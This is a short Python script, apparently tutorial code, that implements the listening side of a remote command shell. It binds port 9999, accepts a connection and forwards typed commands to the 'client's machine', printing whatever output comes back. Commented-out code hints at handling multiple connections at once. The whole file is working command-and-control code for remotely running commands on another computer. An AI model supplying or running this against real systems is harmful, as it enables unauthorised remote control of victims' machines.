import socket, sys#, threading, time
#from queue import Queue
"""
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
"""

#Create a socket (connecting two or more computers)
def socket_creation():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))



#binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port to " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket, Binding error " + str(msg) + "\n" + "Retrying....")
        bind_socket()

#Establish conections with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

#Send commands to client's machine

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    socket_creation()
    bind_socket()
    socket_accept()

main()